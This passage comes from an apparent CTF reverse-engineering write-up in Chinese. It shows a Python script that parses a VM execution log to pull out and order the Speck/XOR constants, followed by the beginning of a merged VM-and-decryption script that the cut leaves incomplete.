</span></span></code></pre></td></tr></table></div></div><p>可以发现不止常量k、c、r不同，运算顺序也有所不同，具体表现在常量k,c的数量和speck加密（看到flag才了解到是这个）以及xor的顺序，其他部分是一致的</p><p>这就比较麻烦了，需要手动去盯帧下常量数据在日志里出现的逻辑以及运算顺序</p><p>在check了7、8轮左右基本找到规律，实现了一个简单的find功能，可以自动找到并排好k、c、r顺序，思路是定位关键指令，看代码和日志就知道我的逻辑了，不再赘述</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=k>with</span> <span class=nb>open</span><span class=p>(</span><span class=s2>&#34;check8.log&#34;</span><span class=p>,</span> <span class=s2>&#34;r&#34;</span><span class=p>)</span> <span class=k>as</span> <span class=n>f</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>lines</span> <span class=o>=</span> <span class=n>f</span><span class=o>.</span><span class=n>readlines</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>i</span> <span class=o>=</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl><span class=n>result</span> <span class=o>=</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl><span class=n>nok</span> <span class=o>=</span> <span class=kc>True</span>
</span></span><span class=line><span class=cl><span class=k>while</span> <span class=n>i</span> <span class=o>&lt;</span> <span class=nb>len</span><span class=p>(</span><span class=n>lines</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>i</span> <span class=o>&lt;</span> <span class=mi>10</span> <span class=ow>and</span> <span class=s2>&#34;RETVAL R7 = 0x00000000000000ff stored at dp=0xffef&#34;</span> <span class=ow>in</span> <span class=n>lines</span><span class=p>[</span><span class=n>i</span><span class=p>]:</span>
</span></span><span class=line><span class=cl>        <span class=n>i</span> <span class=o>+=</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>        <span class=n>k</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>lines</span><span class=p>[</span><span class=n>i</span><span class=p>]</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=s2>&#34;LDI R6 = &#34;</span><span class=p>)[</span><span class=mi>1</span><span class=p>]</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=s2>&#34;,&#34;</span><span class=p>)[</span><span class=mi>0</span><span class=p>],</span> <span class=mi>16</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>result</span><span class=o>.</span><span class=n>append</span><span class=p>([</span><span class=n>i</span><span class=p>,</span> <span class=nb>hex</span><span class=p>(</span><span class=n>k</span><span class=p>),</span> <span class=s2>&#34;k&#34;</span><span class=p>])</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=s2>&#34;XOR R0 ^= imm64&#34;</span> <span class=ow>in</span> <span class=n>lines</span><span class=p>[</span><span class=n>i</span><span class=p>]:</span>
</span></span><span class=line><span class=cl>        <span class=n>c</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>lines</span><span class=p>[</span><span class=n>i</span><span class=p>]</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=s2>&#34;XOR R0 ^= imm64 &#34;</span><span class=p>)[</span><span class=mi>1</span><span class=p>]</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=s2>&#34;:&#34;</span><span class=p>)[</span><span class=mi>0</span><span class=p>],</span> <span class=mi>16</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>result</span><span class=o>.</span><span class=n>append</span><span class=p>([</span><span class=n>i</span><span class=p>,</span> <span class=nb>hex</span><span class=p>(</span><span class=n>c</span><span class=p>),</span> <span class=s2>&#34;c&#34;</span><span class=p>])</span>
</span></span><span class=line><span class=cl>    <span class=n>line</span> <span class=o>=</span> <span class=n>lines</span><span class=p>[</span><span class=n>i</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=s2>&#34;CMP R7 == 0x0000000000000000? R7=0x0000000000000000, ZF=True&#34;</span> <span class=ow>in</span> <span class=n>line</span> <span class=ow>and</span> <span class=n>nok</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>i</span> <span class=o>+=</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>        <span class=k>while</span> <span class=s2>&#34;AND R7 &amp;= R6:&#34;</span> <span class=ow>not</span> <span class=ow>in</span> <span class=n>lines</span><span class=p>[</span><span class=n>i</span><span class=p>]:</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=s2>&#34;XOR R0 ^= imm64&#34;</span> <span class=ow>in</span> <span class=n>lines</span><span class=p>[</span><span class=n>i</span><span class=p>]:</span>
</span></span><span class=line><span class=cl>                <span class=n>c</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>lines</span><span class=p>[</span><span class=n>i</span><span class=p>]</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=s2>&#34;XOR R0 ^= imm64 &#34;</span><span class=p>)[</span><span class=mi>1</span><span class=p>]</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=s2>&#34;:&#34;</span><span class=p>)[</span><span class=mi>0</span><span class=p>],</span> <span class=mi>16</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=n>result</span><span class=o>.</span><span class=n>append</span><span class=p>([</span><span class=n>i</span><span class=p>,</span> <span class=nb>hex</span><span class=p>(</span><span class=n>c</span><span class=p>),</span> <span class=s2>&#34;c&#34;</span><span class=p>])</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=s2>&#34;LDI R1 = &#34;</span> <span class=ow>in</span> <span class=n>lines</span><span class=p>[</span><span class=n>i</span><span class=p>]:</span>
</span></span><span class=line><span class=cl>                <span class=n>r</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>lines</span><span class=p>[</span><span class=n>i</span><span class=p>]</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=s2>&#34;LDI R1 = &#34;</span><span class=p>)[</span><span class=mi>1</span><span class=p>]</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=s2>&#34;,&#34;</span><span class=p>)[</span><span class=mi>0</span><span class=p>],</span> <span class=mi>16</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=n>rr1</span> <span class=o>=</span> <span class=nb>int</span><span class=o>.</span><span class=n>from_bytes</span><span class=p>(</span><span class=n>r</span><span class=o>.</span><span class=n>to_bytes</span><span class=p>(</span><span class=mi>8</span><span class=p>,</span> <span class=n>byteorder</span><span class=o>=</span><span class=s2>&#34;little&#34;</span><span class=p>)[:</span><span class=mi>4</span><span class=p>],</span> <span class=n>byteorder</span><span class=o>=</span><span class=s2>&#34;little&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=n>rr2</span> <span class=o>=</span> <span class=nb>int</span><span class=o>.</span><span class=n>from_bytes</span><span class=p>(</span><span class=n>r</span><span class=o>.</span><span class=n>to_bytes</span><span class=p>(</span><span class=mi>8</span><span class=p>,</span> <span class=n>byteorder</span><span class=o>=</span><span class=s2>&#34;little&#34;</span><span class=p>)[</span><span class=mi>4</span><span class=p>:</span><span class=mi>8</span><span class=p>],</span> <span class=n>byteorder</span><span class=o>=</span><span class=s2>&#34;little&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=n>result</span><span class=o>.</span><span class=n>append</span><span class=p>([</span><span class=n>i</span><span class=p>,</span> <span class=nb>hex</span><span class=p>(</span><span class=n>rr1</span><span class=p>),</span> <span class=s2>&#34;r&#34;</span><span class=p>])</span>
</span></span><span class=line><span class=cl>                <span class=n>result</span><span class=o>.</span><span class=n>append</span><span class=p>([</span><span class=n>i</span><span class=p>,</span> <span class=nb>hex</span><span class=p>(</span><span class=n>rr2</span><span class=p>),</span> <span class=s2>&#34;r&#34;</span><span class=p>])</span>
</span></span><span class=line><span class=cl>            <span class=n>i</span> <span class=o>+=</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>        <span class=n>line</span> <span class=o>=</span> <span class=n>lines</span><span class=p>[</span><span class=n>i</span><span class=p>]</span>
</span></span><span class=line><span class=cl>        <span class=n>k</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>line</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=s2>&#34; &amp; &#34;</span><span class=p>)[</span><span class=mi>1</span><span class=p>]</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=s2>&#34; &#34;</span><span class=p>)[</span><span class=mi>0</span><span class=p>],</span> <span class=mi>16</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>k</span> <span class=o>==</span> <span class=mh>0xfffffffffffffff0</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>nok</span> <span class=o>=</span> <span class=kc>False</span>
</span></span><span class=line><span class=cl>        <span class=k>elif</span> <span class=n>k</span> <span class=o>!=</span> <span class=mi>1</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>result</span><span class=o>.</span><span class=n>append</span><span class=p>([</span><span class=n>i</span><span class=p>,</span> <span class=nb>hex</span><span class=p>(</span><span class=n>k</span><span class=p>),</span> <span class=s2>&#34;k&#34;</span><span class=p>])</span>
</span></span><span class=line><span class=cl>    <span class=n>i</span> <span class=o>+=</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>result</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><p>这里列出了上面代码的结果</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-SQL data-lang=SQL><span class=line><span class=cl><span class=p>[[</span><span class=mi>15</span><span class=p>,</span><span class=w> </span><span class=s1>&#39;0xb70f19bde5399216&#39;</span><span class=p>,</span><span class=w> </span><span class=s1>&#39;k&#39;</span><span class=p>],</span><span class=w> </span><span class=p>[</span><span class=mi>30</span><span class=p>,</span><span class=w> </span><span class=s1>&#39;0x5074d85b9194e696&#39;</span><span class=p>,</span><span class=w> </span><span class=s1>&#39;c&#39;</span><span class=p>],</span><span class=w> </span><span class=p>[</span><span class=mi>48</span><span class=p>,</span><span class=w> </span><span class=s1>&#39;0xaa99b77363a30dcc&#39;</span><span class=p>,</span><span class=w> </span><span class=s1>&#39;k&#39;</span><span class=p>],</span><span class=w> </span><span class=p>[</span><span class=mi>66</span><span class=p>,</span><span class=w> </span><span class=s1>&#39;0x8cb331163a92fc19&#39;</span><span class=p>,</span><span class=w> </span><span class=s1>&#39;c&#39;</span><span class=p>],</span><span class=w> </span><span class=p>[</span><span class=mi>67</span><span class=p>,</span><span class=w> </span><span class=s1>&#39;0xe433713d&#39;</span><span class=p>,</span><span class=w> </span><span class=s1>&#39;r&#39;</span><span class=p>],</span><span class=w> </span><span class=p>[</span><span class=mi>67</span><span class=p>,</span><span class=w> </span><span class=s1>&#39;0x36b1cc9f&#39;</span><span class=p>,</span><span class=w> </span><span class=s1>&#39;r&#39;</span><span class=p>],</span><span class=w> </span><span class=p>[</span><span class=mi>70</span><span class=p>,</span><span class=w> </span><span class=s1>&#39;0x9c84ebd8&#39;</span><span class=p>,</span><span class=w> </span><span class=s1>&#39;r&#39;</span><span class=p>],</span><span class=w> </span><span class=p>[</span><span class=mi>70</span><span class=p>,</span><span class=w> </span><span class=s1>&#39;0xf97646d6&#39;</span><span class=p>,</span><span class=w> </span><span class=s1>&#39;r&#39;</span><span class=p>]]</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><p>手动很麻烦，50个数，所以尝试把VM、find、check解密三个代码合并在一起</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
</span><span class=lnt>  2
</span><span class=lnt>  3
</span><span class=lnt>  4
</span><span class=lnt>  5
</span><span class=lnt>  6
</span><span class=lnt>  7
</span><span class=lnt>  8
</span><span class=lnt>  9
</span><span class=lnt> 10
</span><span class=lnt> 11
</span><span class=lnt> 12
</span><span class=lnt> 13
</span><span class=lnt> 14
</span><span class=lnt> 15
</span><span class=lnt> 16
</span><span class=lnt> 17
</span><span class=lnt> 18
</span><span class=lnt> 19
</span><span class=lnt> 20
</span><span class=lnt> 21
</span><span class=lnt> 22
</span><span class=lnt> 23
</span><span class=lnt> 24
</span><span class=lnt> 25
</span><span class=lnt> 26
</span><span class=lnt> 27
</span><span class=lnt> 28
</span><span class=lnt> 29
</span><span class=lnt> 30
</span><span class=lnt> 31
</span><span class=lnt> 32
</span><span class=lnt> 33
</span><span class=lnt> 34
</span><span class=lnt> 35
</span><span class=lnt> 36
</span><span class=lnt> 37
</span><span class=lnt> 38
</span><span class=lnt> 39
</span><span class=lnt> 40
</span><span class=lnt> 41
</span><span class=lnt> 42
</span><span class=lnt> 43
</span><span class=lnt> 44
</span><span class=lnt> 45
</span><span class=lnt> 46
</span><span class=lnt> 47
</span><span class=lnt> 48
</span><span class=lnt> 49
</span><span class=lnt> 50
</span><span class=lnt> 51
</span><span class=lnt> 52
</span><span class=lnt> 53
</span><span class=lnt> 54
</span><span class=lnt> 55
</span><span class=lnt> 56
</span><span class=lnt> 57
</span><span class=lnt> 58
</span><span class=lnt> 59
</span><span class=lnt> 60
</span><span class=lnt> 61
</span><span class=lnt> 62
</span><span class=lnt> 63
</span><span class=lnt> 64
</span><span class=lnt> 65
</span><span class=lnt> 66
</span><span class=lnt> 67
</span><span class=lnt> 68
</span><span class=lnt> 69
</span><span class=lnt> 70
</span><span class=lnt> 71
</span><span class=lnt> 72
</span><span class=lnt> 73
</span><span class=lnt> 74
</span><span class=lnt> 75
</span><span class=lnt> 76
</span><span class=lnt> 77
</span><span class=lnt> 78
</span><span class=lnt> 79
</span><span class=lnt> 80
</span><span class=lnt> 81
</span><span class=lnt> 82
</span><span class=lnt> 83
</span><span class=lnt> 84
</span><span class=lnt> 85
</span><span class=lnt> 86
</span><span class=lnt> 87
</span><span class=lnt> 88
</span><span class=lnt> 89
</span><span class=lnt> 90
</span><span class=lnt> 91
</span><span class=lnt> 92
</span><span class=lnt> 93
</span><span class=lnt> 94
</span><span class=lnt> 95
</span><span class=lnt> 96
</span><span class=lnt> 97
</span><span class=lnt> 98
</span><span class=lnt> 99
</span><span class=lnt>100
</span><span class=lnt>101
</span><span class=lnt>102
</span><span class=lnt>103
</span><span class=lnt>104
</span><span class=lnt>105
</span><span class=lnt>106
</span><span class=lnt>107
</span><span class=lnt>108
</span><span class=lnt>109
</span><span class=lnt>110
</span><span class=lnt>111
</span><span class=lnt>112
</span><span class=lnt>113
</span><span class=lnt>114
</span><span class=lnt>115
</span><span class=lnt>116
</span><span class=lnt>117
</span><span class=lnt>118
</span><span class=lnt>119
</span><span class=lnt>120
</span><span class=lnt>121
</span><span class=lnt>122
</span><span class=lnt>123
</span><span class=lnt>124
</span><span class=lnt>125
</span><span class=lnt>126
</span><span class=lnt>127
</span><span class=lnt>128
</span><span class=lnt>129
</span><span class=lnt>130
</span><span class=lnt>131
</span><span class=lnt>132
</span><span class=lnt>133
</span><span class=lnt>134
</span><span class=lnt>135
</span><span class=lnt>136
</span><span class=lnt>137
</span><span class=lnt>138
</span><span class=lnt>139
</span><span class=lnt>140
</span><span class=lnt>141
</span><span class=lnt>142
</span><span class=lnt>143
</span><span class=lnt>144
</span><span class=lnt>145
</span><span class=lnt>146
</span><span class=lnt>147
</span><span class=lnt>148
</span><span class=lnt>149
</span><span class=lnt>150
</span><span class=lnt>151
</span><span class=lnt>152
</span><span class=lnt>153
</span><span class=lnt>154
</span><span class=lnt>155
</span><span class=lnt>156
</span><span class=lnt>157
</span><span class=lnt>158
</span><span class=lnt>159
</span><span class=lnt>160
</span><span class=lnt>161
</span><span class=lnt>162
</span><span class=lnt>163
</span><span class=lnt>164
</span><span class=lnt>165
</span><span class=lnt>166
</span><span class=lnt>167
</span><span class=lnt>168
</span><span class=lnt>169
</span><span class=lnt>170
</span><span class=lnt>171
</span><span class=lnt>172
</span><span class=lnt>173
</span><span class=lnt>174
</span><span class=lnt>175
</span><span class=lnt>176
</span><span class=lnt>177
</span><span class=lnt>178
</span><span class=lnt>179
</span><span class=lnt>180
</span><span class=lnt>181
</span><span class=lnt>182
</span><span class=lnt>183
</span><span class=lnt>184
</span><span class=lnt>185
</span><span class=lnt>186
</span><span class=lnt>187
</span><span class=lnt>188
</span><span class=lnt>189
</span><span class=lnt>190
</span><span class=lnt>191
</span><span class=lnt>192
</span><span class=lnt>193
</span><span class=lnt>194
</span><span class=lnt>195
</span><span class=lnt>196
</span><span class=lnt>197
</span><span class=lnt>198
</span><span class=lnt>199
</span><span class=lnt>200
</span><span class=lnt>201
</span><span class=lnt>202
</span><span class=lnt>203
</span><span class=lnt>204
</span><span class=lnt>205
</span><span class=lnt>206
</span><span class=lnt>207
</span><span class=lnt>208
</span><span class=lnt>209
</span><span class=lnt>210
</span><span class=lnt>211
</span><span class=lnt>212
</span><span class=lnt>213
</span><span class=lnt>214
</span><span class=lnt>215
</span><span class=lnt>216
</span><span class=lnt>217
</span><span class=lnt>218
</span><span class=lnt>219
</span><span class=lnt>220
</span><span class=lnt>221
</span><span class=lnt>222
</span><span class=lnt>223
</span><span class=lnt>224
</span><span class=lnt>225
</span><span class=lnt>226
</span><span class=lnt>227
</span><span class=lnt>228
</span><span class=lnt>229
</span><span class=lnt>230
</span><span class=lnt>231
</span><span class=lnt>232
</span><span class=lnt>233
</span><span class=lnt>234
</span><span class=lnt>235
</span><span class=lnt>236
</span><span class=lnt>237
</span><span class=lnt>238
</span><span class=lnt>239
</span><span class=lnt>240
</span><span class=lnt>241
</span><span class=lnt>242
</span><span class=lnt>243
</span><span class=lnt>244
</span><span class=lnt>245
</span><span class=lnt>246
</span><span class=lnt>247
</span><span class=lnt>248
</span><span class=lnt>249
</span><span class=lnt>250
</span><span class=lnt>251
</span><span class=lnt>252
</span><span class=lnt>253
</span><span class=lnt>254
</span><span class=lnt>255
</span><span class=lnt>256
</span><span class=lnt>257
</span><span class=lnt>258
</span><span class=lnt>259
</span><span class=lnt>260
</span><span class=lnt>261
</span><span class=lnt>262
</span><span class=lnt>263
</span><span class=lnt>264
</span><span class=lnt>265
</span><span class=lnt>266
</span><span class=lnt>267
</span><span class=lnt>268
</span><span class=lnt>269
</span><span class=lnt>270
</span><span class=lnt>271
</span><span class=lnt>272
</span><span class=lnt>273
</span><span class=lnt>274
</span><span class=lnt>275
</span><span class=lnt>276
</span><span class=lnt>277
</span><span class=lnt>278
</span><span class=lnt>279
</span><span class=lnt>280
</span><span class=lnt>281
</span><span class=lnt>282
</span><span class=lnt>283
</span><span class=lnt>284
</span><span class=lnt>285
</span><span class=lnt>286
</span><span class=lnt>287
</span><span class=lnt>288
</span><span class=lnt>289
</span><span class=lnt>290
</span><span class=lnt>291
</span><span class=lnt>292
</span><span class=lnt>293
</span><span class=lnt>294
</span><span class=lnt>295
</span><span class=lnt>296
</span><span class=lnt>297
</span><span class=lnt>298
</span><span class=lnt>299
</span><span class=lnt>300
</span><span class=lnt>301
</span><span class=lnt>302
</span><span class=lnt>303
</span><span class=lnt>304
</span><span class=lnt>305
</span><span class=lnt>306
</span><span class=lnt>307
</span><span class=lnt>308
</span><span class=lnt>309
</span><span class=lnt>310
</span><span class=lnt>311
</span><span class=lnt>312
</span><span class=lnt>313
</span><span class=lnt>314
</span><span class=lnt>315
</span><span class=lnt>316
</span><span class=lnt>317
</span><span class=lnt>318
</span><span class=lnt>319
</span><span class=lnt>320
</span><span class=lnt>321
</span><span class=lnt>322
</span><span class=lnt>323
</span><span class=lnt>324
</span><span class=lnt>325
</span><span class=lnt>326
</span><span class=lnt>327
</span><span class=lnt>328
</span><span class=lnt>329
</span><span class=lnt>330
</span><span class=lnt>331
</span><span class=lnt>332
</span><span class=lnt>333
</span><span class=lnt>334
</span><span class=lnt>335
</span><span class=lnt>336
</span><span class=lnt>337
</span><span class=lnt>338
</span><span class=lnt>339
</span><span class=lnt>340
</span><span class=lnt>341
</span><span class=lnt>342
</span><span class=lnt>343
</span><span class=lnt>344
</span><span class=lnt>345
</span><span class=lnt>346
</span><span class=lnt>347
</span><span class=lnt>348
</span><span class=lnt>349
</span><span class=lnt>350
</span><span class=lnt>351
</span><span class=lnt>352
</span><span class=lnt>353
</span><span class=lnt>354
</span><span class=lnt>355
</span><span class=lnt>356
</span><span class=lnt>357
</span><span class=lnt>358
</span><span class=lnt>359
</span><span class=lnt>360
</span><span class=lnt>361
</span><span class=lnt>362
</span><span class=lnt>363
</span><span class=lnt>364
</span><span class=lnt>365
</span><span class=lnt>366
</span><span class=lnt>367
</span><span class=lnt>368
</span><span class=lnt>369
</span><span class=lnt>370
</span><span class=lnt>371
</span><span class=lnt>372
</span><span class=lnt>373
</span><span class=lnt>374
</span><span class=lnt>375
</span><span class=lnt>376
</span><span class=lnt>377
</span><span class=lnt>378
</span><span class=lnt>379
</span><span class=lnt>380
</span><span class=lnt>381
</span><span class=lnt>382
</span><span class=lnt>383
</span><span class=lnt>384
</span><span class=lnt>385
</span><span class=lnt>386
</span><span class=lnt>387
</span><span class=lnt>388
</span><span class=lnt>389
</span><span class=lnt>390
</span><span class=lnt>391
</span><span class=lnt>392
</span><span class=lnt>393
</span><span class=lnt>394
</span><span class=lnt>395
</span><span class=lnt>396
</span><span class=lnt>397
</span><span class=lnt>398
</span><span class=lnt>399
</span><span class=lnt>400
</span><span class=lnt>401
</span><span class=lnt>402
</span><span class=lnt>403
</span><span class=lnt>404
</span><span class=lnt>405
</span><span class=lnt>406
</span><span class=lnt>407
</span><span class=lnt>408
</span><span class=lnt>409
</span><span class=lnt>410
</span><span class=lnt>411
</span><span class=lnt>412
</span><span class=lnt>413
</span><span class=lnt>414
</span><span class=lnt>415
</span><span class=lnt>416
</span><span class=lnt>417
</span><span class=lnt>418
</span><span class=lnt>419
</span><span class=lnt>420
</span><span class=lnt>421
</span><span class=lnt>422
</span><span class=lnt>423
</span><span class=lnt>424
</span><span class=lnt>425
</span><span class=lnt>426
</span><span class=lnt>427
</span><span class=lnt>428
</span><span class=lnt>429
</span><span class=lnt>430
</span><span class=lnt>431
</span><span class=lnt>432
</span><span class=lnt>433
</span><span class=lnt>434
</span><span class=lnt>435
</span><span class=lnt>436
</span><span class=lnt>437
</span><span class=lnt>438
</span><span class=lnt>439
</span><span class=lnt>440
</span><span class=lnt>441
</span><span class=lnt>442
</span><span class=lnt>443
</span><span class=lnt>444
</span><span class=lnt>445
</span><span class=lnt>446
</span><span class=lnt>447
</span><span class=lnt>448
</span><span class=lnt>449
</span><span class=lnt>450
</span><span class=lnt>451
</span><span class=lnt>452
</span><span class=lnt>453
</span><span class=lnt>454
</span><span class=lnt>455
</span><span class=lnt>456
</span><span class=lnt>457
</span><span class=lnt>458
</span><span class=lnt>459
</span><span class=lnt>460
</span><span class=lnt>461
</span><span class=lnt>462
</span><span class=lnt>463
</span><span class=lnt>464
</span><span class=lnt>465
</span><span class=lnt>466
</span><span class=lnt>467
</span><span class=lnt>468
</span><span class=lnt>469
</span><span class=lnt>470
</span><span class=lnt>471
</span><span class=lnt>472
</span><span class=lnt>473
</span><span class=lnt>474
</span><span class=lnt>475
</span><span class=lnt>476
</span><span class=lnt>477
</span><span class=lnt>478
</span><span class=lnt>479
</span><span class=lnt>480
</span><span class=lnt>481
</span><span class=lnt>482
</span><span class=lnt>483
</span><span class=lnt>484
</span><span class=lnt>485
</span><span class=lnt>486
</span><span class=lnt>487
</span><span class=lnt>488
</span><span class=lnt>489
</span><span class=lnt>490
</span><span class=lnt>491
</span><span class=lnt>492
</span><span class=lnt>493
</span><span class=lnt>494
</span><span class=lnt>495
</span><span class=lnt>496
</span><span class=lnt>497
</span><span class=lnt>498
</span><span class=lnt>499
</span><span class=lnt>500
</span><span class=lnt>501
</span><span class=lnt>502
</span><span class=lnt>503
</span><span class=lnt>504
</span><span class=lnt>505
</span><span class=lnt>506
</span><span class=lnt>507
</span><span class=lnt>508
</span><span class=lnt>509
</span><span class=lnt>510
</span><span class=lnt>511
</span><span class=lnt>512
</span><span class=lnt>513
</span><span class=lnt>514
</span><span class=lnt>515
</span><span class=lnt>516
</span><span class=lnt>517
</span><span class=lnt>518
</span><span class=lnt>519
</span><span class=lnt>520
</span><span class=lnt>521
</span><span class=lnt>522
</span><span class=lnt>523
</span><span class=lnt>524
</span><span class=lnt>525
</span><span class=lnt>526
</span><span class=lnt>527
</span><span class=lnt>528
</span><span class=lnt>529
</span><span class=lnt>530
</span><span class=lnt>531
</span><span class=lnt>532
</span><span class=lnt>533
</span><span class=lnt>534
</span><span class=lnt>535
</span><span class=lnt>536
</span><span class=lnt>537
</span><span class=lnt>538
</span><span class=lnt>539
</span><span class=lnt>540
</span><span class=lnt>541
</span><span class=lnt>542
</span><span class=lnt>543
</span><span class=lnt>544
</span><span class=lnt>545
</span><span class=lnt>546
</span><span class=lnt>547
</span><span class=lnt>548
</span><span class=lnt>549
</span><span class=lnt>550
</span><span class=lnt>551
</span><span class=lnt>552
</span><span class=lnt>553
</span><span class=lnt>554
</span><span class=lnt>555
</span><span class=lnt>556
</span><span class=lnt>557
</span><span class=lnt>558
</span><span class=lnt>559
</span><span class=lnt>560
</span><span class=lnt>561
</span><span class=lnt>562
</span><span class=lnt>563
</span><span class=lnt>564
</span><span class=lnt>565
</span><span class=lnt>566
</span><span class=lnt>567
</span><span class=lnt>568
</span><span class=lnt>569
</span><span class=lnt>570
</span><span class=lnt>571
</span><span class=lnt>572
</span><span class=lnt>573
</span><span class=lnt>574
</span><span class=lnt>575
</span><span class=lnt>576
</span><span class=lnt>577
</span><span class=lnt>578
</span><span class=lnt>579
</span><span class=lnt>580
</span><span class=lnt>581
</span><span class=lnt>582
</span><span class=lnt>583
</span><span class=lnt>584
</span><span class=lnt>585
</span><span class=lnt>586
</span><span class=lnt>587
</span><span class=lnt>588
</span><span class=lnt>589
</span><span class=lnt>590
</span><span class=lnt>591
</span><span class=lnt>592
</span><span class=lnt>593
</span><span class=lnt>594
</span><span class=lnt>595
</span><span class=lnt>596
</span><span class=lnt>597
</span><span class=lnt>598
</span><span class=lnt>599
</span><span class=lnt>600
</span><span class=lnt>601
</span><span class=lnt>602
</span><span class=lnt>603
</span><span class=lnt>604
</span><span class=lnt>605
</span><span class=lnt>606
</span><span class=lnt>607
</span><span class=lnt>608
</span><span class=lnt>609
</span><span class=lnt>610
</span><span class=lnt>611
</span><span class=lnt>612
</span><span class=lnt>613
</span><span class=lnt>614
</span><span class=lnt>615
</span><span class=lnt>616
</span><span class=lnt>617
</span><span class=lnt>618
</span><span class=lnt>619
</span><span class=lnt>620
</span><span class=lnt>621
</span><span class=lnt>622
</span><span class=lnt>623
</span><span class=lnt>624
</span><span class=lnt>625
</span><span class=lnt>626
</span><span class=lnt>627
</span><span class=lnt>628
</span><span class=lnt>629
</span><span class=lnt>630
</span><span class=lnt>631
</span><span class=lnt>632
</span><span class=lnt>633
</span><span class=lnt>634
</span><span class=lnt>635
</span><span class=lnt>636
</span><span class=lnt>637
</span><span class=lnt>638
</span><span class=lnt>639
</span><span class=lnt>640
</span><span class=lnt>641
</span><span class=lnt>642
</span><span class=lnt>643
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>struct</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>MEM_SIZE</span> <span class=o>=</span> <span class=mh>0x10000</span>
</span></span><span class=line><span class=cl><span class=n>DATA_QWORD_BASE</span> <span class=o>=</span> <span class=mi>7168</span>  <span class=c1># in qwords</span>
</span></span><span class=line><span class=cl><span class=n>DATA_BASE</span> <span class=o>=</span> <span class=n>DATA_QWORD_BASE</span> <span class=o>*</span> <span class=mi>8</span>  <span class=c1># 0xE000</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>u8</span><span class=p>(</span><span class=n>x</span><span class=p>):</span>  <span class=k>return</span> <span class=n>x</span> <span class=o>&amp;</span> <span class=mh>0xFF</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>u16</span><span class=p>(</span><span class=n>x</span><span class=p>):</span> <span class=k>return</span> <span class=n>x</span> <span class=o>&amp;</span> <span class=mh>0xFFFF</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>u32</span><span class=p>(</span><span class=n>x</span><span class=p>):</span> <span class=k>return</span> <span class=n>x</span> <span class=o>&amp;</span> <span class=mh>0xFFFFFFFF</span>
